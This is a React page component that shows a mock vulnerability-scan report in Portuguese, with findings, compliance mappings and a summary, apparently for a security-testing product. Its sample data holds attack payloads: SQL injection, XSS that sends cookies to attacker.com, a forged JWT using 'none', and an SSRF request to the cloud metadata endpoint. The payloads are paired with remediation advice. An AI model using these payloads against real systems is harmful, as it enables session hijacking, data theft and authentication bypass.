import { useState, useMemo } from 'react'
import { useParams, useNavigate, Link } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import {
  ArrowLeft,
  Download,
  Share2,
  RotateCcw,
  ChevronDown,
  Calendar,
  Clock,
  Copy,
  Check,
  ExternalLink,
  AlertTriangle,
  Shield,
  Lock,
  CreditCard,
  Trash2,
  Zap,
} from 'lucide-react'
import { format, parseISO } from 'date-fns'
import { ptBR } from 'date-fns/locale'

// ─── Types ───────────────────────────────────────────────────────────────────

interface VulnCounts {
  critical: number
  high: number
  medium: number
  low: number
  info: number
}

interface Finding {
  id: string
  title: string
  severity: 'critical' | 'high' | 'medium' | 'low'
  cvss_score: number
  category: string
  cwe_id: string
  endpoint: string
  description: string
  proof_of_concept: string
  server_response?: string
  impact: string[]
  remediation: string[]
  references: { label: string; url: string }[]
}

interface ComplianceItem {
  framework: string
  code: string
  description: string
  vuln_count: number
}

interface ComplianceFramework {
  name: string
  icon: typeof Shield
  color: string
  bg: string
  subtitle: string
  items: ComplianceItem[]
}

interface ReportData {
  id: string
  target_url: string
  scan_date: string
  status: 'completed' | 'running' | 'failed'
  scan_mode: string
  risk_score: number
  duration: string
  vulns: VulnCounts
  findings: Finding[]
  compliance: ComplianceFramework[]
  summary: string[]
}

// ─── Severity Config ─────────────────────────────────────────────────────────

const severityConfig = {
  critical: { color: '#ff0044', bg: 'rgba(255,0,68,0.15)', label: 'Critica' },
  high: { color: '#ff4444', bg: 'rgba(255,68,68,0.15)', label: 'Alta' },
  medium: { color: '#ffb800', bg: 'rgba(255,184,0,0.15)', label: 'Media' },
  low: { color: '#00ff88', bg: 'rgba(0,255,136,0.15)', label: 'Baixa' },
}

// ─── Mock Data ───────────────────────────────────────────────────────────────

const reportData: Record<string, ReportData> = {
  '1': {
    id: '1',
    target_url: 'demo-app.strixguard.com',
    scan_date: '2025-07-10T14:30:00Z',
    status: 'completed',
    scan_mode: 'Standard',
    risk_score: 8.5,
    duration: '12m 34s',
    vulns: { critical: 2, high: 3, medium: 4, low: 2, info: 5 },
    findings: [
      {
        id: 'v1',
        title: 'SQL Injection em /api/users',
        severity: 'critical',
        cvss_score: 9.8,
        category: 'A03:2021 – Injection',
        cwe_id: 'CWE-89',
        endpoint: 'GET /api/users?id=1',
        description:
          'O parametro "id" na endpoint /api/users e vulneravel a injecao SQL. Um atacante pode manipular consultas SQL para extrair, modificar ou excluir dados do banco de dados. A vulnerabilidade foi confirmada atraves de payloads UNION-based que retornaram dados sensiveis.',
        proof_of_concept: "GET /api/users?id=1' UNION SELECT username,password FROM admin--",
        server_response: `HTTP/1.1 200 OK\n{\n  "users": [\n    {"username": "admin", "password": "$2y$10$92IX..."}\n  ]\n}`,
        impact: [
          'Acesso nao autorizado a todos os dados do banco de dados',
          'Possivel extracao completa do banco de dados',
          'Escalacao para execucao de comandos no servidor via xp_cmdshell',
        ],
        remediation: [
          'Use parameterized queries / prepared statements para todas as consultas SQL',
          'Nunca concatene entrada do usuario diretamente em queries SQL',
          'Implemente ORM como Prisma ou Sequelize para abstracao segura',
          'Habilite logs de consultas SQL para deteccao de tentativas de injecao',
        ],
        references: [
          { label: 'OWASP A03:2021 – Injection', url: 'https://owasp.org/Top10/A03_2021-Injection/' },
          { label: 'CWE-89: SQL Injection', url: 'https://cwe.mitre.org/data/definitions/89.html' },
        ],
      },
      {
        id: 'v2',
        title: 'Cross-Site Scripting (XSS) Refletido em /search',
        severity: 'high',
        cvss_score: 7.5,
        category: 'A03:2021 – Injection',
        cwe_id: 'CWE-79',
        endpoint: 'GET /search?q=test',
        description:
          'O parametro de busca "q" reflete entrada do usuario sem sanitizacao adequada, permitindo execucao de scripts maliciosos no contexto do navegador da vitima.',
        proof_of_concept: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
        impact: [
          'Roubo de cookies de sessao e impersonacao de usuarios',
          'Defacement da pagina e redirecionamento para sites maliciosos',
          'Execucao de acoes em nome do usuario logado',
        ],
        remediation: [
          'Implemente encoding de saida HTML para todo conteudo dinamico',
          'Utilize headers Content-Security-Policy (CSP) restrictivos',
          'Valide e sanitize toda entrada de usuario no servidor',
          'Considere frameworks modernos que escapam automaticamente (React, Vue)',
        ],
        references: [
          { label: 'OWASP XSS Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
          { label: 'CWE-79: XSS', url: 'https://cwe.mitre.org/data/definitions/79.html' },
        ],
      },
      {
        id: 'v3',
        title: 'JWT None Algorithm Bypass',
        severity: 'critical',
        cvss_score: 9.1,
        category: 'A07:2021 – Identification and Authentication Failures',
        cwe_id: 'CWE-287',
        endpoint: 'POST /api/auth/verify',
        description:
          'A aplicacao aceita tokens JWT com algoritmo "none", permitindo que um atacante forge tokens validos sem possuir a chave secreta. Isso permite bypass completo da autenticacao.',
        proof_of_concept: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.',
        impact: [
          'Bypass completo da autenticacao da aplicacao',
          'Escalacao de privilegios para administrador',
          'Acesso irrestrito a todos os recursos protegidos',
        ],
        remediation: [
          'Rejeite explicitamente tokens com algoritmo "none" no servidor',
          'Use bibliotecas JWT atualizadas que rejeitam "none" por padrao',
          'Implemente whitelist de algoritmos aceitos (HS256, RS256)',
          'Verifique a assinatura do JWT em todas as rotas protegidas',
        ],
        references: [
          { label: 'OWASP JWT Security', url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html' },
          { label: 'CWE-287: Improper Authentication', url: 'https://cwe.mitre.org/data/definitions/287.html' },
        ],
      },
      {
        id: 'v4',
        title: 'Server-Side Request Forgery (SSRF) em /api/fetch',
        severity: 'high',
        cvss_score: 8.2,
        category: 'A10:2021 – Server-Side Request Forgery',
        cwe_id: 'CWE-918',
        endpoint: 'POST /api/fetch',
        description:
          'O endpoint /api/fetch permite que o servidor faca requisicoes HTTP para URLs arbitrarios controlados pelo usuario. Um atacante pode explorar isso para acessar servicos internos, metadados cloud ou APIs privadas.',
        proof_of_concept: '{"url": "http://169.254.169.254/latest/meta-data/"}',
        impact: [
          'Acesso a servicos internos e infraestrutura da rede privada',
          'Extracao de credenciais de metadados cloud (AWS, GCP, Azure)',
          'Port scanning interno e reconhecimento da rede',
        ],
        remediation: [
          'Valide e restrinja URLs permitidas com whitelist de dominios',
          'Bloqueie requisicoes a IPs privados (RFC 1918) e loopback',
          'Utilize um proxy HTTP controlado para requisicoes externas',
          'Desabilite redirecionamentos automaticos no cliente HTTP',
        ],
        references: [
          { label: 'OWASP SSRF Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html' },
          { label: 'CWE-918: SSRF', url: 'https://cwe.mitre.org/data/definitions/918.html' },
        ],
      },
      {
        id: 'v5',
        title: 'IDOR / Broken Access Control em /api/orders',
        severity: 'high',
        cvss_score: 7.8,
        category: 'A01:2021 – Broken Access Control',
        cwe_id: 'CWE-639',
        endpoint: 'GET /api/orders/{id}',
        description:
          'O endpoint /api/orders permite que qualquer usuario autenticado acesse pedidos de outros usuarios simplesmente alterando o ID na URL. Nao ha verificacao de propriedade do recurso.',
        proof_of_concept: 'GET /api/orders/12345 → retorna pedido de outro usuario',
        impact: [
          'Exposicao de dados sensiveis de outros usuarios',
          'Acesso a informacoes financeiras e pessoais',
          'Possivel cancelamento ou modificacao de pedidos alheios',
        ],
        remediation: [
          'Verifique que o usuario autenticado e dono do recurso solicitado',
          'Use UUIDs em vez de IDs sequenciais para dificultar enumeracao',
          'Implemente autorizacao por middleware em todas as rotas',
          'Logue tentativas de acesso nao autorizado para deteccao',
        ],
        references: [
          { label: 'OWASP A01:2021 – Broken Access Control', url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/' },
          { label: 'CWE-639: Authorization Bypass', url: 'https://cwe.mitre.org/data/definitions/639.html' },
        ],
      },
      {
        id: 'v6',
        title: 'Manipulacao de Preco / Business Logic',
        severity: 'medium',
        cvss_score: 6.1,
        category: 'A04:2021 – Insecure Design',
        cwe_id: 'CWE-840',
        endpoint: 'POST /api/checkout',
        description:
          'O endpoint de checkout aceita o valor total do pedido enviado pelo cliente sem validacao no servidor. Um atacante pode interceptar a requisicao e alterar o preco para qualquer valor, incluindo zero.',
        proof_of_concept: '{"items": [{"id": 1}], "total": 0.01}',
        impact: [
          'Compra de produtos por valores arbitrarios',
          'Perda financeira direta para o negocio',
          'Evasao de taxas, frete e impostos',
        ],
        remediation: [
          'Recalcule o preco total no servidor com base nos itens do carrinho',
          'Nunca confie em valores enviados pelo cliente',
          'Implemente validacao de regras de negocio no backend',
          'Use testes automatizados para verificar integridade do checkout',
        ],
        references: [
          { label: 'OWASP A04:2021 – Insecure Design', url: 'https://owasp.org/Top10/A04_2021-Insecure_Design/' },
          { label: 'CWE-840: Business Logic Errors', url: 'https://cwe.mitre.org/data/definitions/840.html' },
        ],
      },
      {
        id: 'v7',
        title: 'Information Disclosure via Headers',
        severity: 'low',
        cvss_score: 3.7,
        category: 'A05:2021 – Security Misconfiguration',
        cwe_id: 'CWE-200',
        endpoint: 'GET / (global)',
        description:
          'Os headers HTTP da resposta do servidor revelam informacoes sensiveis sobre a stack tecnologica, incluindo versao do servidor web, framework e sistema operacional.',
        proof_of_concept: 'Server: nginx/1.18.0\\nX-Powered-By: Express/4.17.1\\nX-Runtime: ruby',
        impact: [
          'Reconhecimento facilitado da infraestrutura',
          'Atacante pode direcionar exploits especificos para versoes conhecidas',
          'Exposicao de detalhes da arquitetura interna',
        ],
        remediation: [
          'Remova ou ofusque headers que revelam tecnologia (Server, X-Powered-By)',
          'Configure o servidor web para suprimir informacoes de versao',
          'Use um WAF ou reverse proxy para sanitizar headers',
        ],
        references: [
          { label: 'OWASP A05:2021 – Security Misconfiguration', url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/' },
          { label: 'CWE-200: Information Exposure', url: 'https://cwe.mitre.org/data/definitions/200.html' },
        ],
      },
    ],
    compliance: [
      {
        name: 'OWASP Top 10',
        icon: Shield,
        color: '#00f0ff',
        bg: 'rgba(0,240,255,0.08)',
        subtitle: 'Mapeamento de vulnerabilidades para categorias OWASP',
        items: [
          { framework: 'OWASP', code: 'A01:2021 – Broken Access Control', description: 'Falhas de controle de acesso que permitem acesso nao autorizado.', vuln_count: 1 },
          { framework: 'OWASP', code: 'A03:2021 – Injection', description: 'Falhas de injecao como SQL e XSS.', vuln_count: 2 },
          { framework: 'OWASP', code: 'A04:2021 – Insecure Design', description: 'Falhas de design de seguranca e logica de negocio.', vuln_count: 1 },
          { framework: 'OWASP', code: 'A05:2021 – Security Misconfiguration', description: 'Configuracoes inseguras e exposicao de informacoes.', vuln_count: 1 },
          { framework: 'OWASP', code: 'A07:2021 – Identification and Authentication Failures', description: 'Falhas de autenticacao e gerenciamento de sessao.', vuln_count: 1 },
          { framework: 'OWASP', code: 'A10:2021 – Server-Side Request Forgery', description: 'SSRF - requisicoes forjadas do lado do servidor.', vuln_count: 1 },
        ],
      },
      {
        name: 'LGPD',
        icon: Lock,
        color: '#00ff88',
        bg: 'rgba(0,255,136,0.08)',
        subtitle: 'Lei Geral de Protecao de Dados',
        items: [
          { framework: 'LGPD', code: 'Art. 46 – Seguranca do Tratamento', description: 'Obrigatoriedade de medidas tecnicas e administrativas para proteger dados pessoais.', vuln_count: 3 },
          { framework: 'LGPD', code: 'Art. 50 – Violacao de Dados', description: 'Comunicacao a autoridade e aos titulares em caso de incidente.', vuln_count: 2 },
          { framework: 'LGPD', code: 'Art. 13 – Consentimento', description: 'Informacao clara sobre a finalidade do tratamento dos dados.', vuln_count: 0 },
        ],
      },
      {
        name: 'PCI DSS',
        icon: CreditCard,
        color: '#ffb800',
        bg: 'rgba(255,184,0,0.08)',
        subtitle: 'Payment Card Industry Data Security Standard',
        items: [
          { framework: 'PCI DSS', code: 'Req. 6.5.1 – Injection Flaws', description: 'Protecao contra vulnerabilidades de injecao.', vuln_count: 2 },
          { framework: 'PCI DSS', code: 'Req. 6.5.7 – Cross-Site Scripting', description: 'Protecao contra vulnerabilidades XSS.', vuln_count: 1 },
          { framework: 'PCI DSS', code: 'Req. 6.5.8 – Improper Access Control', description: 'Controle de acesso adequado aos recursos.', vuln_count: 2 },
          { framework: 'PCI DSS', code: 'Req. 6.5.10 – Broken Authentication', description: 'Autenticacao segura e gerenciamento de sessao.', vuln_count: 1 },
        ],
      },
    ],
    summary: [
      'O escaneamento da aplicacao demo-app.strixguard.com identificou 7 vulnerabilidades de seguranca, sendo 2 classificadas como criticas e 3 como alta severidade. O score de risco geral e de 8.5/10, indicando um risco significativo que requer atencao imediata.',
      'A vulnerabilidade mais critica e uma injecao SQL no endpoint /api/users, que permite acesso nao autorizado ao banco de dados completo. Alem disso, o bypass de autenticacao via JWT None Algorithm permite que qualquer atacante obtenha acesso administrativo sem credenciais.',
      'Recomenda-se a implementacao imediata de prepared statements, validacao de algoritmos JWT e revisao completa dos controles de acesso. Todas as vulnerabilidades sao passiveis de correcao com boas praticas de desenvolvimento seguro.',
    ],
  },
  '2': {
    id: '2',
    target_url: 'api.ecommerce-client.com',
    scan_date: '2025-07-08T10:15:00Z',
    status: 'completed',
    scan_mode: 'Deep',
    risk_score: 6.2,
    duration: '8m 12s',
    vulns: { critical: 0, high: 2, medium: 5, low: 8, info: 3 },
    findings: [
      {
        id: 'v1',
        title: 'Stored XSS no Campo de Comentarios',
        severity: 'high',
        cvss_score: 7.2,
        category: 'A03:2021 – Injection',
        cwe_id: 'CWE-79',
        endpoint: 'POST /api/comments',
        description: 'O campo de comentarios armazena scripts maliciosos que sao executados quando outros usuarios visualizam a pagina.',
        proof_of_concept: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
        impact: ['Roubo de sessao', 'Keylogging', 'Manipulacao do DOM'],
        remediation: ['Sanitize entrada HTML', 'Implementar CSP', 'Usar DOMPurify'],
        references: [{ label: 'OWASP XSS', url: 'https://owasp.org/www-community/attacks/xss/' }],
      },
      {
        id: 'v2',
        title: 'Exposicao de Dados Sensiveis na API',
        severity: 'high',
        cvss_score: 6.8,
        category: 'A05:2021 – Security Misconfiguration',
        cwe_id: 'CWE-200',
        endpoint: 'GET /api/config',
        description: 'O endpoint de configuracao retorna credenciais do banco de dados e chaves de API sem autenticacao.',
        proof_of_concept: 'GET /api/config → retorna DB_HOST, DB_PASS, API_KEY',
        impact: ['Exposicao de credenciais', 'Acesso ao banco de dados'],
        remediation: ['Remover endpoint de debug', 'Autenticar acesso', 'Usar variaveis de ambiente'],
        references: [{ label: 'OWASP Info Disclosure', url: 'https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration' }],
      },
    ],
    compliance: [
      {
        name: 'OWASP Top 10',
        icon: Shield,
        color: '#00f0ff',
        bg: 'rgba(0,240,255,0.08)',
        subtitle: 'Mapeamento OWASP',
        items: [
          { framework: 'OWASP', code: 'A03:2021 – Injection', description: 'Falhas de injecao.', vuln_count: 1 },
          { framework: 'OWASP', code: 'A05:2021 – Security Misconfiguration', description: 'Configuracoes inseguras.', vuln_count: 1 },
        ],
      },
    ],
    summary: [
      'O escaneamento identificou 2 vulnerabilidades de alta severidade e 5 de media. O score de risco e 6.2/10.',
      'Recomenda-se corrigir as vulnerabilidades de XSS armazenado e exposicao de configuracao para prevenir roubo de dados.',
    ],
  },
}

// ─── Fallback Data Generator ─────────────────────────────────────────────────

function getReportData(id: string): ReportData {
  if (reportData[id]) return reportData[id]
  // Generate fallback data for unknown IDs
  const baseData = reportData['1']
  return {
    ...baseData,
    id,
    target_url: `target-${id}.example.com`,
    risk_score: Math.min(5 + Math.random() * 4, 9.9),
  }
}

// ─── Risk Score Gauge (Large SVG) ───────────────────────────────────────────

function RiskScoreGauge({ score }: { score: number }) {
  const radius = 55
  const stroke = 10
  const normalized = Math.min(score / 10, 1)
  const circumference = 2 * Math.PI * radius
  const arcLength = circumference * 0.75
  const dashOffset = arcLength * (1 - normalized)

  let color = '#00ff88'
  if (score >= 8) color = '#ff4444'
  else if (score >= 4) color = '#ffb800'

  const label = score >= 8 ? 'Risco Alto' : score >= 4 ? 'Risco Medio' : 'Risco Baixo'
  const labelColor = color

  return (
    <div className="flex flex-col items-center">
      <div className="relative" style={{ width: 140, height: 140 }}>
        <svg width="140" height="140" viewBox="0 0 140 140" className="-rotate-[135deg]">
          <circle
            cx="70"
            cy="70"
            r={radius}
            fill="none"
            stroke="#1a1a2e"
            strokeWidth={stroke}
            strokeDasharray={`${arcLength} ${circumference - arcLength}`}
            strokeLinecap="round"
          />
          <motion.circle
            cx="70"
            cy="70"
            r={radius}
            fill="none"
            stroke={color}
            strokeWidth={stroke}
            strokeDasharray={`${arcLength} ${circumference - arcLength}`}
            strokeDashoffset={-arcLength}
            strokeLinecap="round"
            initial={{ strokeDashoffset: -arcLength }}
            animate={{ strokeDashoffset: -dashOffset }}
            transition={{ duration: 1.2, ease: 'easeOut', delay: 0.3 }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <motion.span
            className="font-mono text-3xl font-bold text-text-primary"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5 }}
          >
            {score.toFixed(1)}
          </motion.span>
          <span className="text-[11px] font-medium mt-0.5" style={{ color: labelColor }}>
            {label}
          </span>
        </div>
      </div>
    </div>
  )
}

// ─── Vulnerability Bar ───────────────────────────────────────────────────────

function VulnBar({ vulns }: { vulns: VulnCounts }) {
  const total = vulns.critical + vulns.high + vulns.medium + vulns.low + vulns.info
  if (total === 0) return null

  const segments = [
    { key: 'critical' as const, count: vulns.critical, color: '#ff0044' },
    { key: 'high' as const, count: vulns.high, color: '#ff4444' },
    { key: 'medium' as const, count: vulns.medium, color: '#ffb800' },
    { key: 'low' as const, count: vulns.low, color: '#00ff88' },
  ]

  return (
    <div className="w-full mt-4 pt-4" style={{ borderTop: '1px solid rgba(255,255,255,0.06)' }}>
      <div className="h-3 rounded-full flex overflow-hidden" style={{ background: '#1a1a2e' }}>
        {segments.map(
          (seg) =>
            seg.count > 0 && (
              <motion.div
                key={seg.key}
                initial={{ width: 0 }}
                animate={{ width: `${(seg.count / total) * 100}%` }}
                transition={{ duration: 0.8, ease: 'easeOut', delay: 0.5 }}
                className="h-full"
                style={{ background: seg.color }}
              />
            )
        )}
      </div>
      <div className="flex flex-wrap gap-4 mt-3">
        {segments.map((seg) => (
          <span
            key={seg.key}
            className="inline-flex items-center gap-1.5 text-xs font-medium"
            style={{ color: seg.count > 0 ? seg.color : '#4a4a5e' }}
          >
            <span className="w-2 h-2 rounded-full inline-block" style={{ background: seg.count > 0 ? seg.color : '#4a4a5e' }} />
            {seg.count} {seg.key.charAt(0).toUpperCase() + seg.key.slice(1)}
          </span>
        ))}
      </div>
    </div>
  )
}

// ─── Copy Button ─────────────────────────────────────────────────────────────

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch {
      // Fallback
      const textarea = document.createElement('textarea')
      textarea.value = text
      document.body.appendChild(textarea)
      textarea.select()
      document.execCommand('copy')
      document.body.removeChild(textarea)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <button
      onClick={handleCopy}
      className="p-1.5 rounded-md transition-all duration-200 hover:bg-white/10"
      title="Copiar"
    >
      {copied ? <Check size={14} color="#00ff88" /> : <Copy size={14} color="#6a6a82" />}
    </button>
  )
}

// ─── Finding Accordion Item ──────────────────────────────────────────────────

function FindingItem({
  finding,
  index,
}: {
  finding: Finding
  index: number
}) {
  const [expanded, setExpanded] = useState(index === 0)
  const config = severityConfig[finding.severity]

  return (
    <motion.div
      initial={{ opacity: 0, x: -20 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{
        duration: 0.5,
        ease: [0, 0, 0.2, 1] as [number, number, number, number],
        delay: index * 0.1,
      }}
      style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}
    >
      {/* Collapsed Header */}
      <button
        onClick={() => setExpanded(!expanded)}
        className="w-full flex items-center gap-4 px-6 py-5 text-left transition-colors duration-150 hover:bg-white/[0.02]"
      >
        {/* Severity Indicator */}
        <div className="flex items-center gap-3 shrink-0">
          <div
            className="w-1 h-10 rounded-full"
            style={{ background: config.color }}
          />
          <span
            className="inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-semibold uppercase tracking-wide"
            style={{ background: config.bg, color: config.color }}
          >
            {config.label}
          </span>
        </div>

        {/* Title + Endpoint */}
        <div className="flex-1 min-w-0">
          <h4 className="text-sm font-semibold text-text-primary truncate">
            {finding.title}
          </h4>
          <code className="text-[11px] font-mono text-accent-cyan mt-0.5 block">
            {finding.endpoint}
          </code>
        </div>

        {/* CVSS Badge */}
        <span
          className="hidden sm:inline-flex items-center px-2.5 py-1 rounded-full text-[11px] font-medium shrink-0"
          style={{
            background: finding.severity === 'critical' ? 'rgba(255,0,68,0.1)' : 'rgba(255,68,68,0.1)',
            color: config.color,
          }}
        >
          CVSS {finding.cvss_score}
        </span>

        {/* Chevron */}
        <motion.div
          animate={{ rotate: expanded ? 180 : 0 }}
          transition={{ duration: 0.3 }}
          className="shrink-0"
        >
          <ChevronDown size={18} color="#6a6a82" />
        </motion.div>
      </button>

      {/* Expanded Content */}
      <AnimatePresence>
        {expanded && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.4, ease: 'easeOut' }}
            className="overflow-hidden"
          >
            <div
              className="px-6 pb-6 ml-6"
              style={{
                borderLeft: `3px solid ${config.color}`,
                paddingLeft: 24,
              }}
            >
              {/* Category & CWE */}
              <div className="flex flex-wrap items-center gap-2 mb-4">
                <span className="inline-flex items-center px-2 py-0.5 rounded text-[11px] font-mono bg-bg-tertiary text-text-secondary">
                  {finding.category}
                </span>
                <a
                  href={`https://cwe.mitre.org/data/definitions/${finding.cwe_id.replace('CWE-', '')}.html`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-mono text-accent-cyan hover:underline"
                >
                  {finding.cwe_id}
                  <ExternalLink size={10} />
                </a>
              </div>

              {/* Description */}
              <div className="mb-5">
                <h5 className="text-sm font-semibold text-text-primary mb-2">Descricao</h5>
                <p className="text-sm leading-relaxed" style={{ color: '#a0a0b8' }}>
                  {finding.description}
                </p>
              </div>

              {/* Proof of Concept */}
              <div className="mb-5">
                <div className="flex items-center justify-between mb-2">
                  <h5 className="text-sm font-semibold text-text-primary">Prova de Conceito</h5>
                  <CopyButton text={finding.proof_of_concept} />
                </div>
                <div
                  className="rounded-lg p-4 overflow-x-auto"
                  style={{
                    background: '#08080e',
                    border: '1px solid rgba(0,255,136,0.15)',
                  }}
                >
                  <pre className="font-mono text-xs leading-relaxed" style={{ color: '#00ff88' }}>
                    {finding.proof_of_concept}
                  </pre>
                </div>
                {finding.server_response && (
                  <>
                    <p className="text-[11px] mt-2 mb-1" style={{ color: '#6a6a82' }}>
                      Resposta do servidor:
                    </p>
                    <div
                      className="rounded-lg p-4 overflow-x-auto"
                      style={{
                        background: '#08080e',
                        border: '1px solid rgba(0,255,136,0.1)',
                      }}
                    >
                      <pre className="font-mono text-xs leading-relaxed" style={{ color: '#a0a0b8' }}>
                        {finding.server_response}
                      </pre>
                    </div>
                  </>
                )}
              </div>

              {/* Impact */}
              <div className="mb-5">
                <h5 className="text-sm font-semibold text-text-primary mb-2">Impacto</h5>
                <ul className="space-y-2">
                  {finding.impact.map((item, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm" style={{ color: '#a0a0b8' }}>
                      <AlertTriangle size={14} color="#ff4444" className="shrink-0 mt-0.5" />
                      {item}
                    </li>
                  ))}
                </ul>
              </div>

              {/* Remediation */}
              <div className="mb-5">
                <h5 className="text-sm font-semibold text-text-primary mb-2">Remediacao</h5>
                <ol className="space-y-2">
                  {finding.remediation.map((step, i) => (
                    <li key={i} className="flex items-start gap-3 text-sm" style={{ color: '#a0a0b8' }}>
                      <span
                        className="shrink-0 w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold"
                        style={{
                          background: 'rgba(0,240,255,0.1)',
                          color: '#00f0ff',
                        }}
                      >
                        {i + 1}
                      </span>
                      {step}
                    </li>
                  ))}
                </ol>
              </div>

              {/* References */}
              <div>
                <h5 className="text-sm font-semibold text-text-primary mb-2">Referencias</h5>
                <div className="flex flex-wrap gap-2">
                  {finding.references.map((ref, i) => (
                    <a
                      key={i}
                      href={ref.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all duration-200 hover:underline"
                      style={{
                        background: 'rgba(0,240,255,0.08)',
                        color: '#00f0ff',
                      }}
                    >
                      <ExternalLink size={10} />
                      {ref.label}
                    </a>
                  ))}
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ─── Status Badge ────────────────────────────────────────────────────────────

function StatusBadge({ status }: { status: ReportData['status'] }) {
  const config =
    status === 'completed'
      ? { label: 'Concluido', bg: 'rgba(0,255,136,0.1)', color: '#00ff88' }
      : status === 'running'
        ? { label: 'Em Andamento', bg: 'rgba(0,240,255,0.1)', color: '#00f0ff' }
        : { label: 'Falhou', bg: 'rgba(255,0,68,0.1)', color: '#ff0044' }

  return (
    <span
      className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium"
      style={{ background: config.bg, color: config.color }}
    >
      <span className="w-1.5 h-1.5 rounded-full" style={{ background: config.color }} />
      {config.label}
    </span>
  )
}

// ─── Main Report Detail Page ─────────────────────────────────────────────────

export default function ReportDetail() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const report = useMemo(() => getReportData(id || '1'), [id])

  const totalVulns = report.vulns.critical + report.vulns.high + report.vulns.medium + report.vulns.low

  const handleDownload = () => {
    alert('Download do PDF iniciado')
  }

  const handleShare = () => {
    const url = window.location.href
    navigator.clipboard.writeText(url).then(() => {
      alert('Link copiado para a area de transferencia')
    })
  }

  return (
    <div className="min-h-[calc(100dvh-64px)]" style={{ background: '#0a0a0f' }}>
      <div className="max-w-[1100px] mx-auto px-4 sm:px-6 lg:px-8 pt-12 pb-12">
        {/* ─── Page Header ─────────────────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: [0, 0, 0.2, 1] as [number, number, number, number] }}
          className="flex flex-col lg:flex-row lg:items-start lg:justify-between gap-6 mb-8"
        >
          {/* Left: Back + Info */}
          <div>
            <Link
              to="/reports"
              className="inline-flex items-center gap-1.5 text-sm transition-colors duration-200 hover:text-text-primary"
              style={{ color: '#a0a0b8' }}
            >
              <ArrowLeft size={16} />
              Relatorios
            </Link>
            <h1 className="font-space text-3xl sm:text-4xl font-bold text-text-primary mt-3 tracking-tight">
              {report.target_url}
            </h1>
            <div className="flex flex-wrap items-center gap-4 mt-3">
              <span className="inline-flex items-center gap-1.5 text-xs" style={{ color: '#6a6a82' }}>
                <Calendar size={12} />
                {format(parseISO(report.scan_date), 'dd MMM yyyy, HH:mm', { locale: ptBR })}
              </span>
              <span className="inline-flex items-center gap-1.5 text-xs" style={{ color: '#6a6a82' }}>
                <Clock size={12} />
                {report.duration}
              </span>
              <StatusBadge status={report.status} />
              <span
                className="inline-flex items-center px-2 py-0.5 rounded text-[11px] font-mono"
                style={{ background: 'rgba(185,103,255,0.1)', color: '#b967ff' }}
              >
                {report.scan_mode}
              </span>
            </div>
          </div>

          {/* Right: Actions */}
          <div className="flex flex-wrap items-center gap-3">
            <button
              onClick={handleDownload}
              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-lg text-sm font-semibold transition-all duration-200 hover:brightness-110 hover:scale-[1.02]"
              style={{
                background: 'linear-gradient(135deg, #00f0ff, #00a0aa)',
                color: '#0a0a0f',
              }}
            >
              <Download size={16} />
              Baixar PDF
            </button>
            <button
              onClick={handleShare}
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all duration-200 hover:bg-white/5"
              style={{
                background: 'transparent',
                border: '1px solid rgba(255,255,255,0.1)',
                color: '#a0a0b8',
              }}
            >
              <Share2 size={16} />
              Compartilhar
            </button>
            <button
              onClick={() => navigate('/dashboard')}
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all duration-200 hover:bg-[rgba(0,240,255,0.08)] hover:border-[#00f0ff]"
              style={{
                background: 'transparent',
                border: '1px solid rgba(0,240,255,0.4)',
                color: '#00f0ff',
              }}
            >
              <RotateCcw size={16} />
              Nova Versao
            </button>
          </div>
        </motion.div>

        {/* ─── Executive Summary ───────────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: [0, 0, 0.2, 1] as [number, number, number, number], delay: 0.1 }}
          className="rounded-2xl p-6 sm:p-8 mb-6"
          style={{
            background: '#12121a',
            border: '1px solid rgba(255,255,255,0.06)',
          }}
        >
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* Left: Gauge + Counts */}
            <div className="flex flex-col items-center lg:items-start">
              <RiskScoreGauge score={report.risk_score} />

              {/* Vuln Counts */}
